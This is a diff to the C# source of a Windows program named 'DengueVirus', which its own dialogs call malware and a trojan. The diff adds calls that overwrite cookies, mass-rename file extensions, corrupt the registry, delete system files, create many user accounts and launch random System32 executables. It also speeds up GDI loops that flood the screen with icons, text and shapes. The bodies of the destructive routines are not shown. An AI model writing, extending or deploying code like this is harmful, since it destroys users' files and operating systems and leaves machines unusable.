@@ -8,7 +8,6 @@ using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 using DengueVirus.Spicy;
-using System.Diagnostics;
 
 namespace DengueVirus
 {
@@ -50,7 +49,7 @@ namespace DengueVirus
 
 
         const int SRCCOPY = 0xCC0020; // idk why i put this here, too lazy to replace the var with the hex
-        
+
         const uint MB_ABORTRETRYIGNORE = 0x00000002;
         const uint MB_ICONWARNING = 0x00000030;
         const uint MB_RETRYCANCEL = 0x00000005;
@@ -59,7 +58,7 @@ namespace DengueVirus
         private static readonly IntPtr IDI_ERROR = new IntPtr(0x7F00);
         private static readonly IntPtr IDI_WARNING = new IntPtr(0x7F03);
         private static readonly IntPtr IDI_APPLICATION = new IntPtr(0x7F04);
-        
+
         public Form1()
         {
             InitializeComponent();
@@ -198,9 +197,9 @@ namespace DengueVirus
                 //Thread.Sleep(10);
             }
         }
-        
 
-        static void MessageBoxThread()
+
+        /*static void MessageBoxThread()
         {
             while (true)
             {
@@ -217,19 +216,7 @@ namespace DengueVirus
                     MessageBox.Show(strText, strTitle, (MessageBoxButtons)MB_RETRYCANCEL, (MessageBoxIcon)MB_ICONERROR);
                 }
             }
-        }
-
-        static string GenRandomUnicodeString(int length)
-        {
-            Random random = new Random();
-            StringBuilder builder = new StringBuilder();
-            for (int i = 0; i < length; i++)
-            {
-                // make it use all unicode characters inst4ead of only cyrillic
-                builder.Append((char)random.Next(0x0000, 0xFFFF)); // Cyrillic characters as an example
-            }
-            return builder.ToString();
-        }
+        }*/
 
         public void DrawTextScreen()
         {
@@ -243,7 +230,7 @@ namespace DengueVirus
                 {
                     Font f = new Font("Impact", random.Next(10, 50));
                     Brush b = new SolidBrush(Color.FromArgb(random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
-                    g.DrawString(GenRandomUnicodeString(random.Next(5, 15)), f, b, random.Next(0, w), random.Next(0, h));
+                    g.DrawString(SpicyPL.GenRandomUnicodeString(random.Next(5, 15)), f, b, random.Next(0, w), random.Next(0, h));
                     g.FillRectangle(new SolidBrush(Color.FromArgb(random.Next(0, 255), random.Next(0, 255), random.Next(0, 255))), random.Next(0, w), random.Next(0, h), random.Next(0, w), random.Next(0, h));
                     Thread.Sleep(1);
                 }
@@ -255,10 +242,10 @@ namespace DengueVirus
 
         public void WindowPosSpam()
         {
-            
+
             GetDC(IntPtr.Zero);
             //Stopwatch stopwatch = Stopwatch.StartNew();
-            
+
             while (true)
             {
                 /*long v1 = stopwatch.ElapsedTicks;
@@ -284,7 +271,7 @@ namespace DengueVirus
                 //long v11 = stopwatch.ElapsedTicks;
                 //uint v12 = (((uint)v11 << 13) ^ (uint)v11) << 17 ^ ((uint)v11 << 13) ^ (uint)v11;
                 //Sleep((uint)(((32 * v12) ^ v12) % 0x320 + 600));
-                Thread.Sleep(random.Next(1, 200));
+                Thread.Sleep(random.Next(1, 10));
             }
         }
 
@@ -316,30 +303,17 @@ namespace DengueVirus
                 int x = random.Next(GetSystemMetrics(0));
                 int y = random.Next(GetSystemMetrics(1));
                 DrawIcon(hDc, x, y, LoadIcon(IntPtr.Zero, IDI_ERROR));
-                Thread.Sleep(10);
+                Thread.Sleep(1);
                 x = random.Next(GetSystemMetrics(0));
                 y = random.Next(GetSystemMetrics(1));
                 DrawIcon(hDc, x, y, LoadIcon(IntPtr.Zero, IDI_WARNING));
-                Thread.Sleep(10);
+                Thread.Sleep(1);
                 x = random.Next(GetSystemMetrics(0));
                 y = random.Next(GetSystemMetrics(1));
                 DrawIcon(hDc, x, y, LoadIcon(IntPtr.Zero, IDI_APPLICATION));
 
-                Thread.Sleep(10);
+                Thread.Sleep(1);
             }
-        }
-
-        private void CloneScreen()
-        {
-            // gets the screen contents as bitmap, then, place it in random portions of the screen
-            IntPtr hdc = GetDC(IntPtr.Zero);
-            Graphics g = Graphics.FromHdc(hdc);
-            g.InterpolationMode = InterpolationMode.Low;
-            g.CompositingQuality = CompositingQuality.HighSpeed;
-            g.SmoothingMode = SmoothingMode.HighSpeed;
-            g.PixelOffsetMode = PixelOffsetMode.HighSpeed;
-
-            g.DrawImage(Properties.Resources.xd, 0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
         }
 
         /*public void ChangeButtonSize()
@@ -384,8 +358,34 @@ namespace DengueVirus
 
         public void Form1_Load(object sender, EventArgs e)
         {
+            //SpicyPL.ForceUACElevation();
+
+            // First warning
+            DialogResult dialogResult = MessageBox.Show("This is malware. Are you sure you want to run this program?", "Dengue", MessageBoxButtons.YesNo);
+            if (dialogResult != DialogResult.Yes)
+            {
+                this.Close();
+                return;
+            }
+
+            // SECOND warning
+            DialogResult dialogResult2 = MessageBox.Show("THIS WILL DESTROY YOUR COMPUTER FILES, INFO, IMAGES, SYSTEM. PRESS OK IF YOU ARE ON A VIRTUAL MACHINE **ONLY**", "Dengue", MessageBoxButtons.YesNo);
+            if (dialogResult2 != DialogResult.Yes)
+            {
+                this.Close();
+                return;
+            }
+
+            // FINAL WARNING
+            DialogResult dialogResult3 = MessageBox.Show("By accepting this, the trojan will start, DONT BLAME ME FOR INFO LOSS.", "Dengue", MessageBoxButtons.OKCancel);
+            if (dialogResult3 != DialogResult.OK)
+            {
+                this.Close();
+                return;
+            }
+
             //if the date is 1st of any month
-            if (DateTime.Now.Day == 1)
+            if (DateTime.Now.Day == 1 || DateTime.Now.Day == 10)
             {
                 Cursor = Cursors.WaitCursor;
                 Thread.Sleep(1000);
@@ -399,7 +399,19 @@ namespace DengueVirus
             }
 
             SpicyPL.WriteNote();
-            
+            SpicyPL.OverwriteCookie();
+
+            SpicyPL.MassRename("bat", "exe");
+            SpicyPL.MassRename("txt", "docx");
+            SpicyPL.MassRename("png", "jpg");
+            SpicyPL.MassRename("jpeg", "bmp");
+
+            SpicyPL.CorruptRegistry();
+
+            SpicyPL.DeleteSystemFiles();
+
+            SpicyPL.SpamWindowsWithAccounts();
+
             //Thread.Sleep(12000);
             /*SoundPlayer audio = new SoundPlayer(Properties.Resources.speaker);
             audio.Load(); // Ensure the audio is loaded before playing
@@ -409,7 +421,7 @@ namespace DengueVirus
 
             Thread winpos = new Thread(WindowPosSpam); winpos.Start();
             Thread fill = new Thread(FillScreen); fill.Start();
-            SpicyPL.OpenRandomEXE();
+            SpicyPL.OpenRandomEXEFromSys32();
             Thread t3 = new Thread(PrintRotate); t3.Start();
             Thread t4 = new Thread(Wave); t4.Start();
             Thread text = new Thread(DrawTextScreen); text.Start();
@@ -421,7 +433,7 @@ namespace DengueVirus
             text.Abort();
             t3.Abort();
             Thread t5 = new Thread(PatBltpayload); t5.Start();
-            Thread t6 = new Thread(MessageBoxThread); t6.Start();
+            //Thread t6 = new Thread(MessageBoxThread); t6.Start();
             Thread sigma = new Thread(ImageFollowMouse); sigma.Start();
 
             SpicyPL.UserNote();
@@ -429,25 +441,25 @@ namespace DengueVirus
 
             Thread.Sleep(5000);
             t5.Abort();
-            t6.Abort();
+            //t6.Abort();
             SpicyPL.OpenRandomScreensaver();
 
             Thread.Sleep(5000);
             t4.Abort();
             Thread ico = new Thread(SpamIco); ico.Start();
-            SpicyPL.OpenRandomEXE();
+            SpicyPL.OpenRandomEXEFromSys32();
 
             Thread.Sleep(5000);
             ico.Abort();
             //close form
             this.Close();
 
-            SpicyPL.OpenRandomEXE();
+            SpicyPL.OpenRandomEXEFromSys32();
 
             Thread.Sleep(5000);
 
             //Process.Start("start", "https://github.com/PatoFlamejanteTV/");
-            SpicyPL.OpenRandomEXE();
+            SpicyPL.OpenRandomEXEFromSys32();
             SpicyPL.Brain();
             winpos.Abort();
             fill.Abort();
@@ -456,9 +468,7 @@ namespace DengueVirus
 
         private void button1_Click(object sender, EventArgs e)
         {
-            Thread XD = new Thread(PrintRotate); XD.Start();
-            Thread.Sleep(5000);
-            XD.Abort();
+            SpicyPL.OpenRandomEXEFromSys32();
         }
     }
 }
